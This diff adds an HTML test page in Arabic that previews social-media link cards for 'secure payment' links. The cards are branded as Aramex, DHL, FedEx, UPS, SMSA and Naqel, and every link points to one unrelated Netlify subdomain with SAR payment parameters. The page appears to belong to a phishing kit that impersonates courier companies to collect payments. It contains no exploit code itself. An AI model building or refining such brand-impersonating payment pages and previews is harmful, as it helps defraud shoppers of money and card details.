@@ -1,0 +1,191 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>OG Meta Tags Test - Payment Links</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            max-width: 1200px;
+            margin: 40px auto;
+            padding: 20px;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            direction: rtl;
+        }
+        .container {
+            background: white;
+            padding: 30px;
+            border-radius: 15px;
+            box-shadow: 0 10px 40px rgba(0,0,0,0.2);
+        }
+        h1 {
+            color: #333;
+            text-align: center;
+            margin-bottom: 30px;
+        }
+        .company-card {
+            background: #f8f9fa;
+            border: 2px solid #e9ecef;
+            border-radius: 10px;
+            padding: 20px;
+            margin-bottom: 20px;
+            transition: transform 0.2s, box-shadow 0.2s;
+        }
+        .company-card:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 5px 20px rgba(0,0,0,0.1);
+        }
+        .company-name {
+            font-size: 20px;
+            font-weight: bold;
+            color: #495057;
+            margin-bottom: 10px;
+        }
+        .og-preview {
+            background: white;
+            border: 1px solid #dee2e6;
+            border-radius: 8px;
+            padding: 15px;
+            margin-top: 10px;
+        }
+        .og-image {
+            width: 100%;
+            max-width: 400px;
+            height: 200px;
+            object-fit: cover;
+            border-radius: 5px;
+            margin-bottom: 10px;
+        }
+        .og-title {
+            font-weight: bold;
+            color: #212529;
+            margin-bottom: 5px;
+        }
+        .og-description {
+            color: #6c757d;
+            font-size: 14px;
+            line-height: 1.5;
+        }
+        .test-url {
+            background: #e7f3ff;
+            padding: 10px;
+            border-radius: 5px;
+            font-family: monospace;
+            font-size: 12px;
+            margin-top: 10px;
+            word-break: break-all;
+        }
+        .status {
+            display: inline-block;
+            padding: 5px 10px;
+            border-radius: 5px;
+            font-size: 12px;
+            font-weight: bold;
+        }
+        .status.success {
+            background: #d4edda;
+            color: #155724;
+        }
+        .status.warning {
+            background: #fff3cd;
+            color: #856404;
+        }
+        .instructions {
+            background: #e7f3ff;
+            border-right: 4px solid #0066cc;
+            padding: 15px;
+            margin-bottom: 30px;
+            border-radius: 5px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>🎯 اختبار OG Meta Tags - روابط الدفع</h1>
+        
+        <div class="instructions">
+            <h3>📋 كيفية الاختبار:</h3>
+            <ol>
+                <li>انسخ أي رابط من الأمثلة أدناه</li>
+                <li>افتح <a href="https://developers.facebook.com/tools/debug/" target="_blank">Facebook Sharing Debugger</a></li>
+                <li>الصق الرابط واضغط "Debug"</li>
+                <li>تحقق من ظهور الصورة والعنوان والوصف الصحيح</li>
+            </ol>
+            <p><strong>ملاحظة:</strong> يجب أن يكون الموقع مباشراً على Netlify حتى تعمل الاختبارات.</p>
+        </div>
+
+        <div id="companies"></div>
+    </div>
+
+    <script>
+        const companies = [
+            {
+                name: "أرامكس - Aramex",
+                key: "aramex",
+                image: "/og-aramex.jpg",
+                title: "دفع آمن - أرامكس للشحن السريع 🚚",
+                description: "خدمات شحن عالمية مع أرامكس - أكمل عملية الدفع بأمان تام للحصول على خدمات شحن سريعة وموثوقة في جميع أنحاء الخليج والعالم ✅"
+            },
+            {
+                name: "DHL",
+                key: "dhl",
+                image: "/og-dhl.jpg",
+                title: "دفع آمن - DHL الشحن العالمي السريع ⚡",
+                description: "DHL - الشبكة العالمية الأكبر للشحن السريع - أكمل دفعتك بأمان للحصول على خدمات توصيل سريعة وموثوقة إلى أي مكان في العالم 🌍"
+            },
+            {
+                name: "FedEx",
+                key: "fedex",
+                image: "/og-fedex.jpg",
+                title: "دفع آمن - FedEx الشحن الدولي الموثوق 📦",
+                description: "FedEx - رائدة الشحن الدولي - ادفع بأمان واحصل على خدمات شحن موثوقة مع تتبع فوري وضمان الوصول في الموعد المحدد ⏰"
+            },
+            {
+                name: "UPS",
+                key: "ups",
+                image: "/og-ups.jpg",
+                title: "دفع آمن - UPS للشحن والتوصيل العالمي 🌐",
+                description: "UPS - حلول لوجستية متكاملة - أكمل الدفع بأمان للحصول على خدمات شحن عالمية احترافية مع تغطية شاملة وتتبع دقيق 📍"
+            },
+            {
+                name: "SMSA Express - سمسا",
+                key: "smsa",
+                image: "/og-smsa.jpg",
+                title: "دفع آمن - SMSA Express سمسا إكسبرس 🚛",
+                description: "SMSA Express - الرائدة في الشحن السعودي - أكمل الدفع بأمان للحصول على خدمات توصيل سريعة في جميع أنحاء المملكة 🇸🇦"
+            },
+            {
+                name: "ناقل إكسبريس - Naqel",
+                key: "naqel",
+                image: "/og-naqel.jpg",
+                title: "دفع آمن - ناقل إكسبريس للشحن 🚚",
+                description: "ناقل إكسبريس - خدمات شحن متطورة - أكمل دفعتك بأمان للحصول على توصيل سريع وآمن لجميع مدن ومناطق المملكة ⚡"
+            }
+        ];
+
+        const baseUrl = "https://sensational-fenglisu-ebbbfb.netlify.app";
+        const container = document.getElementById('companies');
+
+        companies.forEach(company => {
+            const testUrl = `${baseUrl}/pay/test123/recipient?company=${company.key}&currency=SAR&title=Payment%20in%20Saudi%20Arabia`;
+            
+            const card = document.createElement('div');
+            card.className = 'company-card';
+            card.innerHTML = `
+                <div class="company-name">${company.name} <span class="status success">✓ Configured</span></div>
+                <div class="og-preview">
+                    <img src="${baseUrl}${company.image}" alt="${company.name}" class="og-image" onerror="this.src='data:image/svg+xml,%3Csvg xmlns=%22http://www.w3.org/2000/svg%22 width=%22400%22 height=%22200%22%3E%3Crect fill=%22%23ddd%22 width=%22400%22 height=%22200%22/%3E%3Ctext x=%2250%25%22 y=%2250%25%22 text-anchor=%22middle%22 dy=%22.3em%22 fill=%22%23999%22%3EImage not found%3C/text%3E%3C/svg%3E'">
+                    <div class="og-title">${company.title}</div>
+                    <div class="og-description">${company.description}</div>
+                </div>
+                <div class="test-url">
+                    <strong>Test URL:</strong><br>
+                    <a href="${testUrl}" target="_blank">${testUrl}</a>
+                </div>
+            `;
+            container.appendChild(card);
+        });
+    </script>
+</body>
+</html>
